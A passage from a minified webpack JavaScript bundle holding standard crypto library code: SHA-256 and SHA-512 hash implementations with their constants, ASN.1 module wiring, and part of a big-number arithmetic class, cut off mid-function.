                for (i = 0; i < msg.length; i += 2) res.push(parseInt(msg[i] + msg[i + 1], 16));
            } else
                for (i = 0; i < msg.length; i++) {
                    var c = msg.charCodeAt(i),
                        hi = c >> 8,
                        lo = 255 & c;
                    hi ? res.push(hi, lo) : res.push(lo);
                }
            return res;
        }),
            (utils.zero2 = zero2),
            (utils.toHex = toHex),
            (utils.encode = function (arr, enc) {
                return "hex" === enc ? toHex(arr) : arr;
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var curve = exports;
        (curve.base = __webpack_require__(41)), (curve.short = __webpack_require__(253)), (curve.mont = __webpack_require__(254)), (curve.edwards = __webpack_require__(255));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var rotr32 = __webpack_require__(13).rotr32;
        function ch32(x, y, z) {
            return (x & y) ^ (~x & z);
        }
        function maj32(x, y, z) {
            return (x & y) ^ (x & z) ^ (y & z);
        }
        function p32(x, y, z) {
            return x ^ y ^ z;
        }
        (exports.ft_1 = function (s, x, y, z) {
            return 0 === s ? ch32(x, y, z) : 1 === s || 3 === s ? p32(x, y, z) : 2 === s ? maj32(x, y, z) : void 0;
        }),
            (exports.ch32 = ch32),
            (exports.maj32 = maj32),
            (exports.p32 = p32),
            (exports.s0_256 = function (x) {
                return rotr32(x, 2) ^ rotr32(x, 13) ^ rotr32(x, 22);
            }),
            (exports.s1_256 = function (x) {
                return rotr32(x, 6) ^ rotr32(x, 11) ^ rotr32(x, 25);
            }),
            (exports.g0_256 = function (x) {
                return rotr32(x, 7) ^ rotr32(x, 18) ^ (x >>> 3);
            }),
            (exports.g1_256 = function (x) {
                return rotr32(x, 17) ^ rotr32(x, 19) ^ (x >>> 10);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            common = __webpack_require__(36),
            shaCommon = __webpack_require__(121),
            assert = __webpack_require__(11),
            sum32 = utils.sum32,
            sum32_4 = utils.sum32_4,
            sum32_5 = utils.sum32_5,
            ch32 = shaCommon.ch32,
            maj32 = shaCommon.maj32,
            s0_256 = shaCommon.s0_256,
            s1_256 = shaCommon.s1_256,
            g0_256 = shaCommon.g0_256,
            g1_256 = shaCommon.g1_256,
            BlockHash = common.BlockHash,
            sha256_K = [
                1116352408,
                1899447441,
                3049323471,
                3921009573,
                961987163,
                1508970993,
                2453635748,
                2870763221,
                3624381080,
                310598401,
                607225278,
                1426881987,
                1925078388,
                2162078206,
                2614888103,
                3248222580,
                3835390401,
                4022224774,
                264347078,
                604807628,
                770255983,
                1249150122,
                1555081692,
                1996064986,
                2554220882,
                2821834349,
                2952996808,
                3210313671,
                3336571891,
                3584528711,
                113926993,
                338241895,
                666307205,
                773529912,
                1294757372,
                1396182291,
                1695183700,
                1986661051,
                2177026350,
                2456956037,
                2730485921,
                2820302411,
                3259730800,
                3345764771,
                3516065817,
                3600352804,
                4094571909,
                275423344,
                430227734,
                506948616,
                659060556,
                883997877,
                958139571,
                1322822218,
                1537002063,
                1747873779,
                1955562222,
                2024104815,
                2227730452,
                2361852424,
                2428436474,
                2756734187,
                3204031479,
                3329325298,
            ];
        function SHA256() {
            if (!(this instanceof SHA256)) return new SHA256();
            BlockHash.call(this), (this.h = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225]), (this.k = sha256_K), (this.W = new Array(64));
        }
        utils.inherits(SHA256, BlockHash),
            (module.exports = SHA256),
            (SHA256.blockSize = 512),
            (SHA256.outSize = 256),
            (SHA256.hmacStrength = 192),
            (SHA256.padLength = 64),
            (SHA256.prototype._update = function (msg, start) {
                for (var W = this.W, i = 0; i < 16; i++) W[i] = msg[start + i];
                for (; i < W.length; i++) W[i] = sum32_4(g1_256(W[i - 2]), W[i - 7], g0_256(W[i - 15]), W[i - 16]);
                var a = this.h[0],
                    b = this.h[1],
                    c = this.h[2],
                    d = this.h[3],
                    e = this.h[4],
                    f = this.h[5],
                    g = this.h[6],
                    h = this.h[7];
                for (assert(this.k.length === W.length), i = 0; i < W.length; i++) {
                    var T1 = sum32_5(h, s1_256(e), ch32(e, f, g), this.k[i], W[i]),
                        T2 = sum32(s0_256(a), maj32(a, b, c));
                    (h = g), (g = f), (f = e), (e = sum32(d, T1)), (d = c), (c = b), (b = a), (a = sum32(T1, T2));
                }
                (this.h[0] = sum32(this.h[0], a)),
                    (this.h[1] = sum32(this.h[1], b)),
                    (this.h[2] = sum32(this.h[2], c)),
                    (this.h[3] = sum32(this.h[3], d)),
                    (this.h[4] = sum32(this.h[4], e)),
                    (this.h[5] = sum32(this.h[5], f)),
                    (this.h[6] = sum32(this.h[6], g)),
                    (this.h[7] = sum32(this.h[7], h));
            }),
            (SHA256.prototype._digest = function (enc) {
                return "hex" === enc ? utils.toHex32(this.h, "big") : utils.split32(this.h, "big");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(13),
            common = __webpack_require__(36),
            assert = __webpack_require__(11),
            rotr64_hi = utils.rotr64_hi,
            rotr64_lo = utils.rotr64_lo,
            shr64_hi = utils.shr64_hi,
            shr64_lo = utils.shr64_lo,
            sum64 = utils.sum64,
            sum64_hi = utils.sum64_hi,
            sum64_lo = utils.sum64_lo,
            sum64_4_hi = utils.sum64_4_hi,
            sum64_4_lo = utils.sum64_4_lo,
            sum64_5_hi = utils.sum64_5_hi,
            sum64_5_lo = utils.sum64_5_lo,
            BlockHash = common.BlockHash,
            sha512_K = [
                1116352408,
                3609767458,
                1899447441,
                602891725,
                3049323471,
                3964484399,
                3921009573,
                2173295548,
                961987163,
                4081628472,
                1508970993,
                3053834265,
                2453635748,
                2937671579,
                2870763221,
                3664609560,
                3624381080,
                2734883394,
                310598401,
                1164996542,
                607225278,
                1323610764,
                1426881987,
                3590304994,
                1925078388,
                4068182383,
                2162078206,
                991336113,
                2614888103,
                633803317,
                3248222580,
                3479774868,
                3835390401,
                2666613458,
                4022224774,
                944711139,
                264347078,
                2341262773,
                604807628,
                2007800933,
                770255983,
                1495990901,
                1249150122,
                1856431235,
                1555081692,
                3175218132,
                1996064986,
                2198950837,
                2554220882,
                3999719339,
                2821834349,
                766784016,
                2952996808,
                2566594879,
                3210313671,
                3203337956,
                3336571891,
                1034457026,
                3584528711,
                2466948901,
                113926993,
                3758326383,
                338241895,
                168717936,
                666307205,
                1188179964,
                773529912,
                1546045734,
                1294757372,
                1522805485,
                1396182291,
                2643833823,
                1695183700,
                2343527390,
                1986661051,
                1014477480,
                2177026350,
                1206759142,
                2456956037,
                344077627,
                2730485921,
                1290863460,
                2820302411,
                3158454273,
                3259730800,
                3505952657,
                3345764771,
                106217008,
                3516065817,
                3606008344,
                3600352804,
                1432725776,
                4094571909,
                1467031594,
                275423344,
                851169720,
                430227734,
                3100823752,
                506948616,
                1363258195,
                659060556,
                3750685593,
                883997877,
                3785050280,
                958139571,
                3318307427,
                1322822218,
                3812723403,
                1537002063,
                2003034995,
                1747873779,
                3602036899,
                1955562222,
                1575990012,
                2024104815,
                1125592928,
                2227730452,
                2716904306,
                2361852424,
                442776044,
                2428436474,
                593698344,
                2756734187,
                3733110249,
                3204031479,
                2999351573,
                3329325298,
                3815920427,
                3391569614,
                3928383900,
                3515267271,
                566280711,
                3940187606,
                3454069534,
                4118630271,
                4000239992,
                116418474,
                1914138554,
                174292421,
                2731055270,
                289380356,
                3203993006,
                460393269,
                320620315,
                685471733,
                587496836,
                852142971,
                1086792851,
                1017036298,
                365543100,
                1126000580,
                2618297676,
                1288033470,
                3409855158,
                1501505948,
                4234509866,
                1607167915,
                987167468,
                1816402316,
                1246189591,
            ];
        function SHA512() {
            if (!(this instanceof SHA512)) return new SHA512();
            BlockHash.call(this),
                (this.h = [1779033703, 4089235720, 3144134277, 2227873595, 1013904242, 4271175723, 2773480762, 1595750129, 1359893119, 2917565137, 2600822924, 725511199, 528734635, 4215389547, 1541459225, 327033209]),
                (this.k = sha512_K),
                (this.W = new Array(160));
        }
        function ch64_hi(xh, xl, yh, yl, zh) {
            var r = (xh & yh) ^ (~xh & zh);
            return r < 0 && (r += 4294967296), r;
        }
        function ch64_lo(xh, xl, yh, yl, zh, zl) {
            var r = (xl & yl) ^ (~xl & zl);
            return r < 0 && (r += 4294967296), r;
        }
        function maj64_hi(xh, xl, yh, yl, zh) {
            var r = (xh & yh) ^ (xh & zh) ^ (yh & zh);
            return r < 0 && (r += 4294967296), r;
        }
        function maj64_lo(xh, xl, yh, yl, zh, zl) {
            var r = (xl & yl) ^ (xl & zl) ^ (yl & zl);
            return r < 0 && (r += 4294967296), r;
        }
        function s0_512_hi(xh, xl) {
            var r = rotr64_hi(xh, xl, 28) ^ rotr64_hi(xl, xh, 2) ^ rotr64_hi(xl, xh, 7);
            return r < 0 && (r += 4294967296), r;
        }
        function s0_512_lo(xh, xl) {
            var r = rotr64_lo(xh, xl, 28) ^ rotr64_lo(xl, xh, 2) ^ rotr64_lo(xl, xh, 7);
            return r < 0 && (r += 4294967296), r;
        }
        function s1_512_hi(xh, xl) {
            var r = rotr64_hi(xh, xl, 14) ^ rotr64_hi(xh, xl, 18) ^ rotr64_hi(xl, xh, 9);
            return r < 0 && (r += 4294967296), r;
        }
        function s1_512_lo(xh, xl) {
            var r = rotr64_lo(xh, xl, 14) ^ rotr64_lo(xh, xl, 18) ^ rotr64_lo(xl, xh, 9);
            return r < 0 && (r += 4294967296), r;
        }
        function g0_512_hi(xh, xl) {
            var r = rotr64_hi(xh, xl, 1) ^ rotr64_hi(xh, xl, 8) ^ shr64_hi(xh, xl, 7);
            return r < 0 && (r += 4294967296), r;
        }
        function g0_512_lo(xh, xl) {
            var r = rotr64_lo(xh, xl, 1) ^ rotr64_lo(xh, xl, 8) ^ shr64_lo(xh, xl, 7);
            return r < 0 && (r += 4294967296), r;
        }
        function g1_512_hi(xh, xl) {
            var r = rotr64_hi(xh, xl, 19) ^ rotr64_hi(xl, xh, 29) ^ shr64_hi(xh, xl, 6);
            return r < 0 && (r += 4294967296), r;
        }
        function g1_512_lo(xh, xl) {
            var r = rotr64_lo(xh, xl, 19) ^ rotr64_lo(xl, xh, 29) ^ shr64_lo(xh, xl, 6);
            return r < 0 && (r += 4294967296), r;
        }
        utils.inherits(SHA512, BlockHash),
            (module.exports = SHA512),
            (SHA512.blockSize = 1024),
            (SHA512.outSize = 512),
            (SHA512.hmacStrength = 192),
            (SHA512.padLength = 128),
            (SHA512.prototype._prepareBlock = function (msg, start) {
                for (var W = this.W, i = 0; i < 32; i++) W[i] = msg[start + i];
                for (; i < W.length; i += 2) {
                    var c0_hi = g1_512_hi(W[i - 4], W[i - 3]),
                        c0_lo = g1_512_lo(W[i - 4], W[i - 3]),
                        c1_hi = W[i - 14],
                        c1_lo = W[i - 13],
                        c2_hi = g0_512_hi(W[i - 30], W[i - 29]),
                        c2_lo = g0_512_lo(W[i - 30], W[i - 29]),
                        c3_hi = W[i - 32],
                        c3_lo = W[i - 31];
                    (W[i] = sum64_4_hi(c0_hi, c0_lo, c1_hi, c1_lo, c2_hi, c2_lo, c3_hi, c3_lo)), (W[i + 1] = sum64_4_lo(c0_hi, c0_lo, c1_hi, c1_lo, c2_hi, c2_lo, c3_hi, c3_lo));
                }
            }),
            (SHA512.prototype._update = function (msg, start) {
                this._prepareBlock(msg, start);
                var W = this.W,
                    ah = this.h[0],
                    al = this.h[1],
                    bh = this.h[2],
                    bl = this.h[3],
                    ch = this.h[4],
                    cl = this.h[5],
                    dh = this.h[6],
                    dl = this.h[7],
                    eh = this.h[8],
                    el = this.h[9],
                    fh = this.h[10],
                    fl = this.h[11],
                    gh = this.h[12],
                    gl = this.h[13],
                    hh = this.h[14],
                    hl = this.h[15];
                assert(this.k.length === W.length);
                for (var i = 0; i < W.length; i += 2) {
                    var c0_hi = hh,
                        c0_lo = hl,
                        c1_hi = s1_512_hi(eh, el),
                        c1_lo = s1_512_lo(eh, el),
                        c2_hi = ch64_hi(eh, el, fh, fl, gh),
                        c2_lo = ch64_lo(eh, el, fh, fl, gh, gl),
                        c3_hi = this.k[i],
                        c3_lo = this.k[i + 1],
                        c4_hi = W[i],
                        c4_lo = W[i + 1],
                        T1_hi = sum64_5_hi(c0_hi, c0_lo, c1_hi, c1_lo, c2_hi, c2_lo, c3_hi, c3_lo, c4_hi, c4_lo),
                        T1_lo = sum64_5_lo(c0_hi, c0_lo, c1_hi, c1_lo, c2_hi, c2_lo, c3_hi, c3_lo, c4_hi, c4_lo);
                    (c0_hi = s0_512_hi(ah, al)), (c0_lo = s0_512_lo(ah, al)), (c1_hi = maj64_hi(ah, al, bh, bl, ch)), (c1_lo = maj64_lo(ah, al, bh, bl, ch, cl));
                    var T2_hi = sum64_hi(c0_hi, c0_lo, c1_hi, c1_lo),
                        T2_lo = sum64_lo(c0_hi, c0_lo, c1_hi, c1_lo);
                    (hh = gh),
                        (hl = gl),
                        (gh = fh),
                        (gl = fl),
                        (fh = eh),
                        (fl = el),
                        (eh = sum64_hi(dh, dl, T1_hi, T1_lo)),
                        (el = sum64_lo(dl, dl, T1_hi, T1_lo)),
                        (dh = ch),
                        (dl = cl),
                        (ch = bh),
                        (cl = bl),
                        (bh = ah),
                        (bl = al),
                        (ah = sum64_hi(T1_hi, T1_lo, T2_hi, T2_lo)),
                        (al = sum64_lo(T1_hi, T1_lo, T2_hi, T2_lo));
                }
                sum64(this.h, 0, ah, al), sum64(this.h, 2, bh, bl), sum64(this.h, 4, ch, cl), sum64(this.h, 6, dh, dl), sum64(this.h, 8, eh, el), sum64(this.h, 10, fh, fl), sum64(this.h, 12, gh, gl), sum64(this.h, 14, hh, hl);
            }),
            (SHA512.prototype._digest = function (enc) {
                return "hex" === enc ? utils.toHex32(this.h, "big") : utils.split32(this.h, "big");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const asn1 = exports;
        (asn1.bignum = __webpack_require__(125)),
            (asn1.define = __webpack_require__(272).define),
            (asn1.base = __webpack_require__(275)),
            (asn1.constants = __webpack_require__(276)),
            (asn1.decoders = __webpack_require__(128)),
            (asn1.encoders = __webpack_require__(126));
    },
    function (module, exports, __webpack_require__) {
        (function (module) {
            !(function (module, exports) {
                "use strict";
                function assert(val, msg) {
                    if (!val) throw new Error(msg || "Assertion failed");
                }
                function inherits(ctor, superCtor) {
                    ctor.super_ = superCtor;
                    var TempCtor = function () {};
                    (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                }
                function BN(number, base, endian) {
                    if (BN.isBN(number)) return number;
                    (this.negative = 0),
                        (this.words = null),
                        (this.length = 0),
                        (this.red = null),
                        null !== number && (("le" !== base && "be" !== base) || ((endian = base), (base = 10)), this._init(number || 0, base || 10, endian || "be"));
                }
                var Buffer;
                "object" == typeof module ? (module.exports = BN) : (exports.BN = BN), (BN.BN = BN), (BN.wordSize = 26);
                try {
                    Buffer = "undefined" != typeof window && void 0 !== window.Buffer ? window.Buffer : __webpack_require__(271).Buffer;
                } catch (e) {}
                function parseHex4Bits(string, index) {
                    var c = string.charCodeAt(index);
                    return c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : (c - 48) & 15;
                }
                function parseHexByte(string, lowerBound, index) {
                    var r = parseHex4Bits(string, index);
                    return index - 1 >= lowerBound && (r |= parseHex4Bits(string, index - 1) << 4), r;
                }
                function parseBase(str, start, end, mul) {
                    for (var r = 0, len = Math.min(str.length, end), i = start; i < len; i++) {
                        var c = str.charCodeAt(i) - 48;
                        (r *= mul), (r += c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c);
                    }
                    return r;
                }
                (BN.isBN = function (num) {
                    return num instanceof BN || (null !== num && "object" == typeof num && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words));
                }),
                    (BN.max = function (left, right) {
                        return left.cmp(right) > 0 ? left : right;
                    }),
                    (BN.min = function (left, right) {
                        return left.cmp(right) < 0 ? left : right;
                    }),
                    (BN.prototype._init = function (number, base, endian) {
                        if ("number" == typeof number) return this._initNumber(number, base, endian);
                        if ("object" == typeof number) return this._initArray(number, base, endian);
                        "hex" === base && (base = 16), assert(base === (0 | base) && base >= 2 && base <= 36);
                        var start = 0;
                        "-" === (number = number.toString().replace(/\s+/g, ""))[0] && (start++, (this.negative = 1)),
                            start < number.length && (16 === base ? this._parseHex(number, start, endian) : (this._parseBase(number, base, start), "le" === endian && this._initArray(this.toArray(), base, endian)));
                    }),
                    (BN.prototype._initNumber = function (number, base, endian) {
                        number < 0 && ((this.negative = 1), (number = -number)),
                            number < 67108864
                                ? ((this.words = [67108863 & number]), (this.length = 1))
                                : number < 4503599627370496
                                ? ((this.words = [67108863 & number, (number / 67108864) & 67108863]), (this.length = 2))
                                : (assert(number < 9007199254740992), (this.words = [67108863 & number, (number / 67108864) & 67108863, 1]), (this.length = 3)),
                            "le" === endian && this._initArray(this.toArray(), base, endian);
                    }),
                    (BN.prototype._initArray = function (number, base, endian) {
                        if ((assert("number" == typeof number.length), number.length <= 0)) return (this.words = [0]), (this.length = 1), this;
                        (this.length = Math.ceil(number.length / 3)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var j,
                            w,
                            off = 0;
                        if ("be" === endian)
                            for (i = number.length - 1, j = 0; i >= 0; i -= 3)
                                (w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        else if ("le" === endian)
                            for (i = 0, j = 0; i < number.length; i += 3)
                                (w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        return this.strip();
                    }),
                    (BN.prototype._parseHex = function (number, start, endian) {
                        (this.length = Math.ceil((number.length - start) / 6)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var w,
                            off = 0,
                            j = 0;
                        if ("be" === endian)
                            for (i = number.length - 1; i >= start; i -= 2) (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        else
                            for (i = (number.length - start) % 2 == 0 ? start + 1 : start; i < number.length; i += 2)
                                (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        this.strip();
                    }),
                    (BN.prototype._parseBase = function (number, base, start) {
                        (this.words = [0]), (this.length = 1);
                        for (var limbLen = 0, limbPow = 1; limbPow <= 67108863; limbPow *= base) limbLen++;
                        limbLen--, (limbPow = (limbPow / base) | 0);
                        for (var total = number.length - start, mod = total % limbLen, end = Math.min(total, total - mod) + start, word = 0, i = start; i < end; i += limbLen)
                            (word = parseBase(number, i, i + limbLen, base)), this.imuln(limbPow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        if (0 !== mod) {
                            var pow = 1;
                            for (word = parseBase(number, i, number.length, base), i = 0; i < mod; i++) pow *= base;
                            this.imuln(pow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        }
                        this.strip();
                    }),
                    (BN.prototype.copy = function (dest) {
                        dest.words = new Array(this.length);
                        for (var i = 0; i < this.length; i++) dest.words[i] = this.words[i];
                        (dest.length = this.length), (dest.negative = this.negative), (dest.red = this.red);
                    }),
                    (BN.prototype.clone = function () {
                        var r = new BN(null);
                        return this.copy(r), r;
                    }),
                    (BN.prototype._expand = function (size) {
                        for (; this.length < size; ) this.words[this.length++] = 0;
                        return this;
                    }),
                    (BN.prototype.strip = function () {
                        for (; this.length > 1 && 0 === this.words[this.length - 1]; ) this.length--;
                        return this._normSign();
                    }),
                    (BN.prototype._normSign = function () {
                        return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this;
                    }),
                    (BN.prototype.inspect = function () {
                        return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
                    });
                var zeros = [
                        "",
                        "0",
                        "00",
                        "000",
                        "0000",
                        "00000",
                        "000000",
                        "0000000",
                        "00000000",
                        "000000000",
                        "0000000000",
                        "00000000000",
                        "000000000000",
                        "0000000000000",
                        "00000000000000",
                        "000000000000000",
                        "0000000000000000",
                        "00000000000000000",
                        "000000000000000000",
                        "0000000000000000000",
                        "00000000000000000000",
                        "000000000000000000000",
                        "0000000000000000000000",
                        "00000000000000000000000",
                        "000000000000000000000000",
                        "0000000000000000000000000",
                    ],
                    groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                    groupBases = [
                        0,
                        0,
                        33554432,
                        43046721,
                        16777216,
                        48828125,
                        60466176,
                        40353607,
                        16777216,
                        43046721,
                        1e7,
                        19487171,
                        35831808,
                        62748517,
                        7529536,
                        11390625,
                        16777216,
                        24137569,
                        34012224,
                        47045881,
                        64e6,
                        4084101,
                        5153632,
                        6436343,
                        7962624,
                        9765625,
                        11881376,
                        14348907,
                        17210368,
                        20511149,
                        243e5,
                        28629151,
                        33554432,
                        39135393,
                        45435424,
                        52521875,
                        60466176,
                    ];
                function smallMulTo(self, num, out) {
                    out.negative = num.negative ^ self.negative;
                    var len = (self.length + num.length) | 0;
                    (out.length = len), (len = (len - 1) | 0);
                    var a = 0 | self.words[0],
                        b = 0 | num.words[0],
                        r = a * b,
                        lo = 67108863 & r,
                        carry = (r / 67108864) | 0;
                    out.words[0] = lo;
                    for (var k = 1; k < len; k++) {
                        for (var ncarry = carry >>> 26, rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = (k - j) | 0;
                            (ncarry += ((r = (a = 0 | self.words[i]) * (b = 0 | num.words[j]) + rword) / 67108864) | 0), (rword = 67108863 & r);
                        }
                        (out.words[k] = 0 | rword), (carry = 0 | ncarry);
                    }
                    return 0 !== carry ? (out.words[k] = 0 | carry) : out.length--, out.strip();
                }
                (BN.prototype.toString = function (base, padding) {
                    var out;
                    if (((padding = 0 | padding || 1), 16 === (base = base || 10) || "hex" === base)) {
                        out = "";
                        for (var off = 0, carry = 0, i = 0; i < this.length; i++) {
                            var w = this.words[i],
                                word = (16777215 & ((w << off) | carry)).toString(16);
                            (out = 0 !== (carry = (w >>> (24 - off)) & 16777215) || i !== this.length - 1 ? zeros[6 - word.length] + word + out : word + out), (off += 2) >= 26 && ((off -= 26), i--);
                        }
                        for (0 !== carry && (out = carry.toString(16) + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    if (base === (0 | base) && base >= 2 && base <= 36) {
                        var groupSize = groupSizes[base],
                            groupBase = groupBases[base];
                        out = "";
                        var c = this.clone();
                        for (c.negative = 0; !c.isZero(); ) {
                            var r = c.modn(groupBase).toString(base);
                            out = (c = c.idivn(groupBase)).isZero() ? r + out : zeros[groupSize - r.length] + r + out;
                        }
                        for (this.isZero() && (out = "0" + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    assert(!1, "Base should be between 2 and 36");
                }),
                    (BN.prototype.toNumber = function () {
                        var ret = this.words[0];
                        return (
                            2 === this.length
                                ? (ret += 67108864 * this.words[1])
                                : 3 === this.length && 1 === this.words[2]
                                ? (ret += 4503599627370496 + 67108864 * this.words[1])
                                : this.length > 2 && assert(!1, "Number can only safely store up to 53 bits"),
                            0 !== this.negative ? -ret : ret
                        );
                    }),
                    (BN.prototype.toJSON = function () {
                        return this.toString(16);
                    }),
                    (BN.prototype.toBuffer = function (endian, length) {
                        return assert(void 0 !== Buffer), this.toArrayLike(Buffer, endian, length);
                    }),
                    (BN.prototype.toArray = function (endian, length) {
                        return this.toArrayLike(Array, endian, length);
                    }),
                    (BN.prototype.toArrayLike = function (ArrayType, endian, length) {
                        var byteLength = this.byteLength(),
                            reqLength = length || Math.max(1, byteLength);
                        assert(byteLength <= reqLength, "byte array longer than desired length"), assert(reqLength > 0, "Requested array length <= 0"), this.strip();
                        var b,
                            i,
                            littleEndian = "le" === endian,
                            res = new ArrayType(reqLength),
                            q = this.clone();
                        if (littleEndian) {
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[i] = b);
                            for (; i < reqLength; i++) res[i] = 0;
                        } else {
                            for (i = 0; i < reqLength - byteLength; i++) res[i] = 0;
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[reqLength - i - 1] = b);
                        }
                        return res;
                    }),
                    Math.clz32
                        ? (BN.prototype._countBits = function (w) {
                              return 32 - Math.clz32(w);
                          })
                        : (BN.prototype._countBits = function (w) {
                              var t = w,
                                  r = 0;
                              return t >= 4096 && ((r += 13), (t >>>= 13)), t >= 64 && ((r += 7), (t >>>= 7)), t >= 8 && ((r += 4), (t >>>= 4)), t >= 2 && ((r += 2), (t >>>= 2)), r + t;
                          }),
                    (BN.prototype._zeroBits = function (w) {
                        if (0 === w) return 26;
                        var t = w,
                            r = 0;
                        return 0 == (8191 & t) && ((r += 13), (t >>>= 13)), 0 == (127 & t) && ((r += 7), (t >>>= 7)), 0 == (15 & t) && ((r += 4), (t >>>= 4)), 0 == (3 & t) && ((r += 2), (t >>>= 2)), 0 == (1 & t) && r++, r;
                    }),
                    (BN.prototype.bitLength = function () {
                        var w = this.words[this.length - 1],
                            hi = this._countBits(w);
                        return 26 * (this.length - 1) + hi;
                    }),
                    (BN.prototype.zeroBits = function () {
                        if (this.isZero()) return 0;
                        for (var r = 0, i = 0; i < this.length; i++) {
                            var b = this._zeroBits(this.words[i]);
                            if (((r += b), 26 !== b)) break;
                        }
                        return r;
                    }),
                    (BN.prototype.byteLength = function () {
                        return Math.ceil(this.bitLength() / 8);
                    }),
                    (BN.prototype.toTwos = function (width) {
                        return 0 !== this.negative ? this.abs().inotn(width).iaddn(1) : this.clone();
                    }),
                    (BN.prototype.fromTwos = function (width) {
                        return this.testn(width - 1) ? this.notn(width).iaddn(1).ineg() : this.clone();
                    }),
                    (BN.prototype.isNeg = function () {
                        return 0 !== this.negative;
                    }),
                    (BN.prototype.neg = function () {
                        return this.clone().ineg();
                    }),
                    (BN.prototype.ineg = function () {
                        return this.isZero() || (this.negative ^= 1), this;
                    }),
                    (BN.prototype.iuor = function (num) {
                        for (; this.length < num.length; ) this.words[this.length++] = 0;
                        for (var i = 0; i < num.length; i++) this.words[i] = this.words[i] | num.words[i];
                        return this.strip();
                    }),
                    (BN.prototype.ior = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuor(num);
                    }),
                    (BN.prototype.or = function (num) {
                        return this.length > num.length ? this.clone().ior(num) : num.clone().ior(this);
                    }),
                    (BN.prototype.uor = function (num) {
                        return this.length > num.length ? this.clone().iuor(num) : num.clone().iuor(this);
                    }),
                    (BN.prototype.iuand = function (num) {
                        var b;
                        b = this.length > num.length ? num : this;
                        for (var i = 0; i < b.length; i++) this.words[i] = this.words[i] & num.words[i];
                        return (this.length = b.length), this.strip();
                    }),
                    (BN.prototype.iand = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuand(num);
                    }),
                    (BN.prototype.and = function (num) {
                        return this.length > num.length ? this.clone().iand(num) : num.clone().iand(this);
                    }),
                    (BN.prototype.uand = function (num) {
                        return this.length > num.length ? this.clone().iuand(num) : num.clone().iuand(this);
                    }),
                    (BN.prototype.iuxor = function (num) {
                        var a, b;
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var i = 0; i < b.length; i++) this.words[i] = a.words[i] ^ b.words[i];
                        if (this !== a) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = a.length), this.strip();
                    }),
                    (BN.prototype.ixor = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuxor(num);
                    }),
                    (BN.prototype.xor = function (num) {
                        return this.length > num.length ? this.clone().ixor(num) : num.clone().ixor(this);
                    }),
                    (BN.prototype.uxor = function (num) {
                        return this.length > num.length ? this.clone().iuxor(num) : num.clone().iuxor(this);
                    }),
                    (BN.prototype.inotn = function (width) {
                        assert("number" == typeof width && width >= 0);
                        var bytesNeeded = 0 | Math.ceil(width / 26),
                            bitsLeft = width % 26;
                        this._expand(bytesNeeded), bitsLeft > 0 && bytesNeeded--;
                        for (var i = 0; i < bytesNeeded; i++) this.words[i] = 67108863 & ~this.words[i];
                        return bitsLeft > 0 && (this.words[i] = ~this.words[i] & (67108863 >> (26 - bitsLeft))), this.strip();
                    }),
                    (BN.prototype.notn = function (width) {
                        return this.clone().inotn(width);
                    }),
                    (BN.prototype.setn = function (bit, val) {
                        assert("number" == typeof bit && bit >= 0);
                        var off = (bit / 26) | 0,
                            wbit = bit % 26;
                        return this._expand(off + 1), (this.words[off] = val ? this.words[off] | (1 << wbit) : this.words[off] & ~(1 << wbit)), this.strip();
                    }),
                    (BN.prototype.iadd = function (num) {
                        var r, a, b;
                        if (0 !== this.negative && 0 === num.negative) return (this.negative = 0), (r = this.isub(num)), (this.negative ^= 1), this._normSign();
                        if (0 === this.negative && 0 !== num.negative) return (num.negative = 0), (r = this.isub(num)), (num.negative = 1), r._normSign();
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (r = (0 | a.words[i]) + (0 | b.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
